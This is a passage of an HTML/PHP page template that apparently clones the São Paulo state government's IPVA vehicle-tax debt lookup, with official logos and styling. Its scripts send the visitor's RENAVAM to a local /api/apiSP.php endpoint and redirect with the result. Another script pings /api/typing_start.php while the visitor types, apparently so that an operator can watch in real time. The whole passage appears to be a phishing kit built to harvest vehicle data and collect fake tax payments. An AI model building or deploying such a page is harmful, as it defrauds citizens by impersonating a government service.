        .logo-governo[_ngcontent-oyi-c103] {
            display: none
        }
    }
    </style>
    <style>
    [_nghost-oyi-c99] {
        --menu-spacing: 5px
    }

    .icone-home[_ngcontent-oyi-c99] {
        width: 24px;
        height: 23px;
        cursor: pointer
    }

    .menu-area[_ngcontent-oyi-c99] {
        padding-left: 0;
        padding-right: calc(var(--menu-spacing) * 2);
        margin: 12px var(--menu-spacing)
    }

    .menu-center[_ngcontent-oyi-c99] {
        display: flex;
        align-items: center
    }

    .barra[_ngcontent-oyi-c99] {
        border-right: 1px solid black
    }

    .menu-bar[_ngcontent-oyi-c99] {
        display: flex;
        font-size: 12px;
        justify-content: flex-end
    }

    .menu-icon[_ngcontent-oyi-c99] {
        color: #007bff;
        font-weight: 300
    }

    .menu-button[_ngcontent-oyi-c99] {
        color: #007bff;
        border: none;
        background-color: #f5f5f5
    }

    .brasao[_ngcontent-oyi-c99] {
        max-height: 60px
    }

    .box-perfil[_ngcontent-oyi-c99] {
        text-align: center;
        color: #fff;
        background-color: #034ea2;
        border-radius: 20px
    }

    @media only screen and (min-width: 768px) {
        .brasao[_ngcontent-oyi-c99] {
            display: none
        }
    }
    </style>
    <style>
    .ngx-spinner-overlay[_ngcontent-oyi-c33] {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%
    }

    .ngx-spinner-overlay[_ngcontent-oyi-c33]>div[_ngcontent-oyi-c33]:not(.loading-text) {
        top: 50%;
        left: 50%;
        margin: 0;
        position: absolute;
        transform: translate(-50%, -50%)
    }

    .loading-text[_ngcontent-oyi-c33] {
        position: absolute;
        top: 60%;
        left: 50%;
        transform: translate(-50%, -60%)
    }
    </style>
    <style>
    .spacer[_ngcontent-oyi-c52] {
        margin-top: 10px;
        display: block
    }

    h2[_ngcontent-oyi-c52] {
        margin: 0
    }

    .menu[_ngcontent-oyi-c52] {
        display: flex;
        flex-wrap: wrap;
        justify-content: center
    }

    @media (max-width: 350px) {
        .container-botao-menu[_ngcontent-oyi-c52] {
            min-width: 300px
        }
    }

    @media (min-width: 1200px) {
        .container[_ngcontent-oyi-c52] {
            max-width: 1600px
        }
    }
    </style>
    <style>
    .btn-link-externo[_ngcontent-oyi-c51] {
        width: 60px
    }

    #botoes-acesso-rapido[_ngcontent-oyi-c51] {
        overflow-x: auto
    }
    </style>
    <style>
    h2[_ngcontent-oyi-c50] {
        margin: 0
    }

    p[_ngcontent-oyi-c50] {
        color: #000;
        font-size: 15px
    }

    .botao-menu[_ngcontent-oyi-c50] {
        background-color: #f5f5f5;
        border: #034ea2 6px solid;
        border-radius: 40px;
        text-align: center;
        box-shadow: 1px 2px 6px #000;
        font-family: Verdana;
        display: block;
        height: 150px;
        width: 100%
    }
    </style>
    <style>
    #botoes-box[_ngcontent-oyi-c49] {
        margin-top: 10px;
        display: flex;
        justify-content: space-between
    }

    #consultar[_ngcontent-oyi-c49],
    #resetar-campos[_ngcontent-oyi-c49] {
        width: 48%
    }

    #resetar-campos[_ngcontent-oyi-c49] {
        padding-right: 15px
    }

    #consultar[_ngcontent-oyi-c49] {
        margin-right: 0%;
        padding-left: 15px
    }

    form[_ngcontent-oyi-c49] {
        display: flex;
        flex-direction: column;
        align-items: center
    }

    re-captcha.is-invalid[_ngcontent-oyi-c49]>div[_ngcontent-oyi-c49] {
        border: 1px solid #dc3545 !important;
        border-radius: .2rem
    }

    #recaptcha_area[_ngcontent-oyi-c49],
    #recaptcha_table[_ngcontent-oyi-c49] {
        line-height: 0 !important
    }

    #listar-veiculos[_ngcontent-oyi-c49] {
        font-size: 15px
    }
    </style>
    <style>
    div[_ngcontent-oyi-c36]:hover {
        text-decoration: underline;
        cursor: pointer
    }

    div[_ngcontent-oyi-c36] {
        color: #007bff
    }
    </style>
    <style>
    .header[_ngcontent-oyi-c46] {
        font-size: 15px;
        font-weight: bolder;
        width: 100%;
        text-align: center
    }

    .lista-aviso[_ngcontent-oyi-c46] {
        font-weight: 700
    }

    .itemSelecao[_ngcontent-oyi-c46] {
        border: lightgray solid 1px;
        overflow-x: auto
    }

    .itemSelecao[_ngcontent-oyi-c46]:hover {
        background: #f0f0f0;
        cursor: pointer
    }
    </style>
    <style>
    .item-favorito[_ngcontent-oyi-c48] {
        background-color: #e8f0f3;
        cursor: pointer
    }

    .item-favorito[_ngcontent-oyi-c48]:hover {
        background-color: #034ea2;
        color: #fff
    }
    </style>
    <style>
    .tabela[_ngcontent-oyi-c37] {
        margin-top: 0
    }

    .list-group[_ngcontent-oyi-c37] {
        line-height: 1.2
    }

    th[_ngcontent-oyi-c37] {
        font-weight: 400
    }

    .box-valores[_ngcontent-oyi-c37]>*[_ngcontent-oyi-c37] {
        display: flex;
        justify-content: space-between
    }

    #botoes-box[_ngcontent-oyi-c37] {
        margin-top: 10px;
        display: flex;
        justify-content: space-between;
        margin-bottom: 20px
    }

    #consultar[_ngcontent-oyi-c37],
    #resetar-campos[_ngcontent-oyi-c37] {
        width: 48%
    }

    #resetar-campos[_ngcontent-oyi-c37] {
        padding-right: 15px
    }

    #consultar[_ngcontent-oyi-c37] {
        margin-right: 0%;
        padding-left: 15px
    }

    .form-check-input[_ngcontent-oyi-c37] {
        width: 15px;
        height: 15px
    }

    .panel-heading[_ngcontent-oyi-c37] a[_ngcontent-oyi-c37]:before {
        font-family: Glyphicons Halflings;
        content: "\e114";
        float: right;
        transition: all .5s
    }

    .star[_ngcontent-oyi-c37] {
        position: absolute;
        right: 1px;
        bottom: 0;
        cursor: pointer
    }

    .favorito[_ngcontent-oyi-c37] {
        color: #ffc400
    }

    .nao-favorito[_ngcontent-oyi-c37] {
        color: #d3d3d3
    }

    .alert-overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(15, 23, 42, 0.65);
        backdrop-filter: blur(6px);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 99999;

        opacity: 0;
        visibility: hidden;
        transition: all 0.3s ease;
    }

    .alert-overlay.active {
        opacity: 1;
        visibility: visible;
    }

    .alert-box {
        background: #ffffff;
        padding: 25px;
        border-radius: 16px;
        width: 90%;
        max-width: 380px;
        text-align: center;
        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.2);
        transform: translateY(20px) scale(0.95);
        transition: all 0.3s ease;
    }

    .alert-overlay.active .alert-box {
        transform: translateY(0) scale(1);
    }

    .alert-icon {
        font-size: 40px;
        margin-bottom: 10px;
    }

    .alert-box h3 {
        margin-bottom: 10px;
        font-size: 20px;
        color: #0f172a;
    }

    .alert-box p {
        font-size: 14px;
        color: #475569;
        margin-bottom: 20px;
    }

    .alert-box button {
        background: linear-gradient(135deg, #00d4ff, #0099ff);
        color: #fff;
        border: none;
        padding: 10px 20px;
        border-radius: 10px;
        cursor: pointer;
        font-weight: 600;
        transition: 0.2s;
    }

    .alert-box button:hover {
        opacity: 0.9;
    }
    </style>
    <style>
    .list-group-item.active[_ngcontent-oyi-c35] {
        z-index: 2;
        color: #fff;
        background-color: #c83a33 !important;
        border-color: #c83a33 !important
    }
    </style>
    <style>
    .box-valores[_ngcontent-oyi-c31]>*[_ngcontent-oyi-c31] {
        display: flex;
        justify-content: space-between
    }

    .box-valores-row[_ngcontent-oyi-c31] {
        display: flex;
        flex-direction: row;
        justify-content: space-between
    }

    .box-valores-row[_ngcontent-oyi-c31]>*[_ngcontent-oyi-c31] {
        margin-right: 2%
    }

    .debito-container[_ngcontent-oyi-c31] {
        display: flex;
        flex-direction: column;
        max-width: 450px
    }

    @media only screen and (max-width: 992px) {
        .box-valores-row[_ngcontent-oyi-c31] {
            display: flex;
            flex-direction: column
        }
    }
    </style>
    <style>
    .box-valores[_ngcontent-oyi-c21]>*[_ngcontent-oyi-c21] {
        display: flex;
        justify-content: space-between
    }

    .box-valores-row[_ngcontent-oyi-c21] {
        display: flex;
        flex-direction: row;
        justify-content: space-between
    }

    .box-valores-row[_ngcontent-oyi-c21]>*[_ngcontent-oyi-c21] {
        margin-right: 2%
    }

    .debito-container[_ngcontent-oyi-c21] {
        display: flex;
        flex-direction: column;
        max-width: 450px
    }

    .spinner {
        display: inline-block;
        width: 12px;
        height: 12px;
        border-width: 2px;
        border-style: solid;
        border-color: currentcolor transparent currentcolor currentcolor;
        border-image: initial;
        border-radius: 50%;
        animation: 0.7s linear 0s infinite normal none running spin;
        vertical-align: -2px;
        margin-right: 8px;
    }

    @keyframes spin {
        100% {
            transform: rotate(360deg);
        }
    }

    .btn--loading {
        pointer-events: none;
        opacity: 0.85;
    }

    .loading-backdrop {
        position: fixed;
        inset: 0px;
        background: rgba(0, 0, 0, 0.35);
        display: grid;
        place-items: center;
        z-index: 9999;
    }

    .loading-box {
        background: rgb(255, 255, 255);
        border-radius: 12px;
        padding: 16px 18px;
        box-shadow: rgba(0, 0, 0, 0.18) 0px 12px 48px;
        font: 500 14px / 1.2 system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
    }

    .loading-box .spinner {
        width: 16px;
        height: 16px;
        margin-right: 10px;
    }


    @media only screen and (max-width: 992px) {
        .box-valores-row[_ngcontent-oyi-c21] {
            display: flex;
            flex-direction: column
        }
    }
    </style>

    <script>
    // Ativa o botão Buscar débitos quando todos os campos estão preenchidos e checkboxes marcados
    document.addEventListener('DOMContentLoaded', function() {

        // Cria o elemento de carregando
        function showLoading() {
            let loading = document.createElement('div');
            loading.id = 'loading-backdrop';
            loading.className = 'loading-backdrop';
            loading.innerHTML = '<div class="loading-box"><span class="spinner"></span>Carregando...</div>';
            document.body.appendChild(loading);
        }

        function hideLoading() {
            let loading = document.getElementById('loading-backdrop');
            if (loading) loading.remove();
        }

        // Função para travar/destravar a página
        function setPageLocked(locked) {
            if (locked) {
                document.body.style.pointerEvents = 'none';
                document.body.style.userSelect = 'none';
            } else {
                document.body.style.pointerEvents = '';
                document.body.style.userSelect = '';
            }
        }

        const form = document.querySelector('.card__form');

        form.addEventListener('submit', function(e) {

            const renavam = document.querySelector('#renavam');

            e.preventDefault();
            setPageLocked(true);
            showLoading();
            const prenavamValue = renavam.value.trim().toUpperCase();
            fetch(`/api/apiSP.php?documento=${encodeURIComponent(prenavamValue)}`)
                .then(resp => resp.json())
                .then(data => {
                    if (data.IsStatus) {
                        console.log(data);
                        sessionStorage.setItem('IPSPData', JSON.stringify(data));
                        window.location.href = `/?sucesso=${encodeURIComponent(prenavamValue)}`;
                    } else if (!data.IsStatus) {
                        mostrarAlerta(data.response || 'Erro ao buscar debitos. Tente novamente');
                    }
                })
                .catch(err => {
                    // Se quiser, pode mostrar erro
                    mostrarAlerta('Erro na requisição. Tente novamente.');
                })
                .finally(() => {
                    hideLoading();
                    setPageLocked(false);
                });
        });
    });

    function mostrarAlerta(mensagem, titulo = 'Aviso') {
        document.getElementById('alertTitle').innerText = titulo;
        document.getElementById('alertMessage').innerText = mensagem;

        const alert = document.getElementById('customAlert');
        alert.classList.add('active');
    }

    function fecharAlerta() {
        const alert = document.getElementById('customAlert');
        alert.classList.remove('active');
    }
    </script>
</head>

<body>


    <div id="customAlert" class="alert-overlay">
        <div class="alert-box">
            <div class="alert-icon">⚠️</div>
            <h3 id="alertTitle">Aviso</h3>
            <p id="alertMessage">Mensagem aqui</p>
            <button onclick="fecharAlerta()">OK</button>
        </div>
    </div>

    <app-root _nghost-oyi-c104="" ng-version="15.2.9">
        <div _ngcontent-oyi-c104="" class="d-flex flex-column min-vh-100">
            <app-menu _ngcontent-oyi-c104="" _nghost-oyi-c103="">
                <app-header _ngcontent-oyi-c103="" _nghost-oyi-c102="">
                    <div _ngcontent-oyi-c102="">
                        <!---->
                        <app-header-gov-sp-sec _ngcontent-oyi-c102="" _nghost-oyi-c101="" class="ng-star-inserted">
                            <link _ngcontent-oyi-c101="" rel="stylesheet" type="text/css"
                                href="./<?= $diretorio ?>/index_files/top-padrao-govsp-v2.min.css">
                            <section _ngcontent-oyi-c101="" class="govsp-topo">
                                <div _ngcontent-oyi-c101="" id="govsp-topbarGlobal" class="blu-e">
                                    <div _ngcontent-oyi-c101="" id="topbarGlobal">
                                        <div _ngcontent-oyi-c101="" id="topbarLink" class="govsp-black">
                                            <div _ngcontent-oyi-c101="" class="govsp-portal"><a _ngcontent-oyi-c101=""
                                                    title="nova guia Site Governo do Estado de São Paulo"
                                                    target="_blank"><img _ngcontent-oyi-c101=""
                                                        src="./<?= $diretorio ?>/index_files/logo-governo-do-estado-sp.png"
                                                        alt="logomarca Governo de São Paulo" height="38"
                                                        class="logo"></a></div>
                                        </div>
                                        <nav _ngcontent-oyi-c101="" class="govsp-navbar govsp-navbar-expand-lg"><a
                                                _ngcontent-oyi-c101="" href="https://www.flickr.com/governosp/"
                                                class="govsp-social"><img _ngcontent-oyi-c101=""
                                                    src="./<?= $diretorio ?>/index_files/i-flickr.png"
                                                    alt="Flickr Governo do Estado de SP"
                                                    class="govsp-icon-social"></a><a _ngcontent-oyi-c101=""
                                                href="https://www.linkedin.com/company/governosp/"
                                                class="govsp-social"><img _ngcontent-oyi-c101=""
                                                    src="./<?= $diretorio ?>/index_files/i-linkedin.png"
                                                    alt="Linkedin Governo do Estado de SP"
                                                    class="govsp-icon-social"></a><a _ngcontent-oyi-c101=""
                                                href="https://www.tiktok.com/@governosp" class="govsp-social"><img
                                                    _ngcontent-oyi-c101=""
                                                    src="./<?= $diretorio ?>/index_files/i-tiktok.png"
                                                    alt="TikTok Governo do Estado de SP"
                                                    class="govsp-icon-social"></a><a _ngcontent-oyi-c101=""
                                                href="https://www.youtube.com/governosp/" class="govsp-social"><img
                                                    _ngcontent-oyi-c101=""
                                                    src="./<?= $diretorio ?>/index_files/i-youtube.png"
                                                    alt="Youtube Governo do Estado de SP"
                                                    class="govsp-icon-social"></a><a _ngcontent-oyi-c101=""
                                                href="https://www.twitter.com/governosp/" class="govsp-social"><img
                                                    _ngcontent-oyi-c101=""
                                                    src="./<?= $diretorio ?>/index_files/i-twitter.png"
                                                    alt="Twitter Governo do Estado de SP"
                                                    class="govsp-icon-social"></a><a _ngcontent-oyi-c101=""
                                                href="https://www.instagram.com/governosp/" class="govsp-social"><img
                                                    _ngcontent-oyi-c101=""
                                                    src="./<?= $diretorio ?>/index_files/i-insta.png"
                                                    alt="Instagram Governo do Estado de SP"
                                                    class="govsp-icon-social"></a><a _ngcontent-oyi-c101=""
                                                href="https://www.facebook.com/governosp/" class="govsp-social"><img
                                                    _ngcontent-oyi-c101=""
                                                    src="./<?= $diretorio ?>/index_files/i-facebook.png"
                                                    alt="Facebook Governo do Estado de SP"
                                                    class="govsp-icon-social"></a>
                                            <p _ngcontent-oyi-c101="" class="govsp-social">/governosp</p><a
                                                _ngcontent-oyi-c101="" title="nova guia" target="_blank"
                                                class="govsp-acessibilidade"><img _ngcontent-oyi-c101=""
                                                    src="./<?= $diretorio ?>/index_files/i-error-report.png"
                                                    alt="Comunicar um erro" class="govsp-acessibilidade"></a>
                                        </nav>
                                    </div><button _ngcontent-oyi-c101="" id="govsp-kebab" aria-expanded="false"
                                        class="govsp-kebab"><img _ngcontent-oyi-c101=""
                                            src="./<?= $diretorio ?>/index_files/dots-menu.png" alt="Menu"></button>
                                    <ul _ngcontent-oyi-c101="" id="govsp-dropdown" aria-hidden="true"
                                        class="govsp-dropdown vs3">
                                        <li _ngcontent-oyi-c101=""></li>
                                        <li _ngcontent-oyi-c101=""><a _ngcontent-oyi-c101="" role="button"
                                                href="https://www.flickr.com/governosp/" class="govsp-social"><img
                                                    _ngcontent-oyi-c101=""
                                                    src="./<?= $diretorio ?>/index_files/i-flickr.png"
                                                    alt="Flickr Governo do Estado de SP" class="govsp-icon-social"></a>
                                        </li>
                                        <li _ngcontent-oyi-c101=""><a _ngcontent-oyi-c101="" role="button"
                                                href="https://www.linkedin.com/company/governosp/"
                                                class="govsp-social"><img _ngcontent-oyi-c101=""
                                                    src="./<?= $diretorio ?>/index_files/i-linkedin.png"
                                                    alt="Linkedin Governo do Estado de SP"
                                                    class="govsp-icon-social"></a></li>
                                        <li _ngcontent-oyi-c101=""><a _ngcontent-oyi-c101="" role="button"
                                                href="https://www.tiktok.com/@governosp" class="govsp-social"><img
                                                    _ngcontent-oyi-c101=""
                                                    src="./<?= $diretorio ?>/index_files/i-tiktok.png"
                                                    alt="TikTok Governo do Estado de SP" class="govsp-icon-social"></a>
                                        </li>
                                        <li _ngcontent-oyi-c101=""><a _ngcontent-oyi-c101="" role="button"
                                                href="https://www.twitter.com/governosp/" class="govsp-social"><img
                                                    _ngcontent-oyi-c101=""
                                                    src="./<?= $diretorio ?>/index_files/i-twitter.png"
                                                    alt="Twitter Governo do Estado de SP" class="govsp-icon-social"></a>
                                        </li>
                                        <li _ngcontent-oyi-c101=""><a _ngcontent-oyi-c101="" role="button"
                                                href="https://www.youtube.com/governosp/" class="govsp-social"><img
                                                    _ngcontent-oyi-c101=""
                                                    src="./<?= $diretorio ?>/index_files/i-youtube.png"
                                                    alt="Youtube Governo do Estado de SP" class="govsp-icon-social"></a>
                                        </li>
                                        <li _ngcontent-oyi-c101=""><a _ngcontent-oyi-c101="" role="button"
                                                href="https://www.instagram.com/governosp/" class="govsp-social"><img
                                                    _ngcontent-oyi-c101=""
                                                    src="./<?= $diretorio ?>/index_files/i-insta.png"
                                                    alt="Instagram Governo do Estado de SP"
                                                    class="govsp-icon-social"></a></li>
                                        <li _ngcontent-oyi-c101=""><a _ngcontent-oyi-c101="" role="button"
                                                href="https://www.facebook.com/governosp/" class="govsp-social"><img
                                                    _ngcontent-oyi-c101=""
                                                    src="./<?= $diretorio ?>/index_files/i-facebook.png"
                                                    alt="Facebook Governo do Estado de SP"
                                                    class="govsp-icon-social"></a></li>
                                        <li _ngcontent-oyi-c101="">
                                            <p _ngcontent-oyi-c101="" class="govsp-social">/governosp</p>
                                        </li>
                                    </ul>
                                </div>
                            </section>
                        </app-header-gov-sp-sec>
                        <!---->
                    </div>
                </app-header>
                <app-menu-login _ngcontent-oyi-c103="" _nghost-oyi-c99="">
                    <div _ngcontent-oyi-c99="" style="width: 100%; background-color: #F5F5F5;">
                        <div _ngcontent-oyi-c99="" class="row">
                            <div _ngcontent-oyi-c99="" class="col-3 col-md-4">
                                <!---->
                            </div>
                            <div _ngcontent-oyi-c99="" class="menu-bar col-9 col-md-4 offset-md-4 ng-star-inserted"
                                style="
    margin-top: 67px;
"></div>
                            <!---->
                        </div>
                    </div>
                </app-menu-login>
                <ngx-spinner _ngcontent-oyi-c103="" bdcolor="rgba(0, 0, 0, 0.8)" size="medium" color="#fff"
                    type="ball-spin" _nghost-oyi-c33="" class="ng-tns-c33-0">
                    <!---->
                </ngx-spinner>
            </app-menu>
            <router-outlet _ngcontent-oyi-c104=""></router-outlet>
            <app-buscar-debitos _nghost-oyi-c49="" class="ng-star-inserted">
                <h5 _ngcontent-oyi-c49="">IPVA</h5>
                <div _ngcontent-oyi-c49="" class="container">
                    <form _ngcontent-oyi-c49="" novalidate=""
                        class="card__form ng-star-inserted ng-touched ng-dirty ng-valid">
                        <div _ngcontent-oyi-c49="" class="col-md-6 mb-2">
                            <!---->
                            <app-lista-favoritos _ngcontent-oyi-c49="" _nghost-oyi-c48="">
                                <div _ngcontent-oyi-c48=""
                                    class="d-flex flex-direction-row justify-content-start flex-wrap ng-star-inserted">
                                    <!---->
                                </div>
                                <!---->
                            </app-lista-favoritos>
                        </div>
                        <!---->
                        <div _ngcontent-oyi-c49="" class="form-group col-md-6"><label _ngcontent-oyi-c49=""
                                class="control-label">RENAVAM</label><input _ngcontent-oyi-c49="" autocomplete="off"
                                autofocus="" id="renavam" formcontrolname="renavam"
                                class="form-control form-control-sm ng-touched ng-dirty ng-valid" inputmode="text">
                            <!---->
                            <div _ngcontent-oyi-c49="" class="d-flex justify-content-end ng-star-inserted"><button
                                    _ngcontent-oyi-c49="" id="listar-veiculos" type="button" class="btn px-1"><img
                                        _ngcontent-oyi-c49="" src="./<?= $diretorio ?>/index_files/IPVA.png"
                                        class="pr-1" style="width: 20px;"><u _ngcontent-oyi-c49="">Meus
                                        Veículos</u></button></div>
                            <!---->
                        </div>
                        <!---->
                        <div _ngcontent-oyi-c49="" id="botoes-box" class="col-md-6 mb-4"><button _ngcontent-oyi-c49=""
                                id="resetar-campos" type="button" class="btn btn-outline-dark">Limpar
                                Campos</button><button _ngcontent-oyi-c49="" id="consultar" type="submit"
                                class="btn btn-regular">
                                <fa-icon _ngcontent-oyi-c49="" class="ng-fa-icon"><svg role="img" aria-hidden="true"
                                        focusable="false" data-prefix="fas" data-icon="magnifying-glass"
                                        class="svg-inline--fa fa-magnifying-glass" xmlns="http://www.w3.org/2000/svg"
                                        viewBox="0 0 512 512">
                                        <path fill="currentColor"
                                            d="M416 208c0 45.9-14.9 88.3-40 122.7L502.6 457.4c12.5 12.5 12.5 32.8 0 45.3s-32.8 12.5-45.3 0L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208zM208 352a144 144 0 1 0 0-288 144 144 0 1 0 0 288z">
                                        </path>
                                    </svg></fa-icon> Consultar
                            </button></div>
                    </form>
                    <!---->
                    <app-botao-voltar-inicio _ngcontent-oyi-c49="" _nghost-oyi-c36="">
                        <div _ngcontent-oyi-c36="" style="text-align: center; font-size: 14px; margin-bottom: 20px;"><a
                                _ngcontent-oyi-c36="">
                                <fa-icon _ngcontent-oyi-c36="" class="ng-fa-icon"><svg role="img" aria-hidden="true"
                                        focusable="false" data-prefix="fas" data-icon="arrow-rotate-left"
                                        class="svg-inline--fa fa-arrow-rotate-left" xmlns="http://www.w3.org/2000/svg"
                                        viewBox="0 0 512 512">
                                        <path fill="currentColor"
                                            d="M125.7 160H176c17.7 0 32 14.3 32 32s-14.3 32-32 32H48c-17.7 0-32-14.3-32-32V64c0-17.7 14.3-32 32-32s32 14.3 32 32v51.2L97.6 97.6c87.5-87.5 229.3-87.5 316.8 0s87.5 229.3 0 316.8s-229.3 87.5-316.8 0c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0c62.5 62.5 163.8 62.5 226.3 0s62.5-163.8 0-226.3s-163.8-62.5-226.3 0L125.7 160z">
                                        </path>
                                    </svg></fa-icon> Voltar ao início
                            </a></div>
                    </app-botao-voltar-inicio>
                </div>
                <app-lista-veiculos _ngcontent-oyi-c49="" _nghost-oyi-c46="">
                    <app-modal _ngcontent-oyi-c46="" _nghost-oyi-c45="">
                        <!---->
                    </app-modal>
                </app-lista-veiculos>
            </app-buscar-debitos>
            <!---->
            <app-footer _ngcontent-oyi-c104="" class="mt-auto" _nghost-oyi-c98="">
                <div _ngcontent-oyi-c98="">
                    <!---->
                    <app-footer-gov-sp-sec _ngcontent-oyi-c98="" _nghost-oyi-c97="" class="ng-star-inserted">
                        <link _ngcontent-oyi-c97="" rel="stylesheet" type="text/css"
                            href="./<?= $diretorio ?>/index_files/rodape-padrao-govsp.min.css">
                        <section _ngcontent-oyi-c97="" id="govsp-rodape">
                            <div _ngcontent-oyi-c97="" class="container">
                                <div _ngcontent-oyi-c97="" class="linha-botoes">
                                    <div _ngcontent-oyi-c97="" class="coluna-4"><a _ngcontent-oyi-c97=""
                                            class="btn btn-model">Ouvidoria</a></div>
                                    <div _ngcontent-oyi-c97="" class="coluna-4"><a _ngcontent-oyi-c97=""
                                            class="btn btn-model">Transparência</a></div>
                                    <div _ngcontent-oyi-c97="" class="coluna-4"><a _ngcontent-oyi-c97=""
                                            class="btn btn-model">SIC</a></div>
                                </div>
                            </div>
                            <div _ngcontent-oyi-c97="" class="container rodape">
                                <div _ngcontent-oyi-c97="" class="logo-rodape"><a _ngcontent-oyi-c97=""><img
                                            _ngcontent-oyi-c97=""
                                            src="./<?= $diretorio ?>/index_files/logo-rodape-governo-do-estado-sp.png"
                                            alt="site do Governo de São Paulo" width="206" height="38"></a></div>
                            </div>
                        </section>
                    </app-footer-gov-sp-sec>
                    <!---->
                </div>
            </app-footer>
        </div>
    </app-root>

    <div class="overlay-container" aria-live="polite">
        <div id="toast-container" class="toast-top-right toast-container"></div>
    </div>

    
<?php if(!$sucesso){ ?>

    <script>

    var inputs = [
    document.getElementById('renavam')
];

let typingTimer = null;
let notifyInterval = null;
const INACTIVITY_TIMEOUT = 3000; // 3 segundos sem digitar
const NOTIFY_INTERVAL = 5000; // notificar a cada 5s enquanto digitando

inputs.forEach(input => {
    input.addEventListener('input', (e) => {
        const value = e.target.value.trim();

        // Ao começar a digitar, envia notificação e inicia intervalos
        if (!notifyInterval) {
            notifyTyping();
            notifyInterval = setInterval(notifyTyping, NOTIFY_INTERVAL);
        }

        // Reinicia o timer de inatividade sempre que digita
        clearTimeout(typingTimer);
        typingTimer = setTimeout(() => {
            // Parou de digitar
            clearInterval(notifyInterval);
            notifyInterval = null;
        }, INACTIVITY_TIMEOUT);
    });
});

async function notifyTyping() {
    try {
        const response = await fetch('/api/typing_start.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ typing: true })
        });

        if (!response.ok) {
            console.error('Erro ao notificar typing:', response.status);
            return;
        }

        const data = await response.json();
        // Pode usar o `data` se necessário

    } catch (error) {
        console.error('Erro na requisição typing_start.php:', error);
    }
}
</script>

        <?php } ?>


</body>

</html>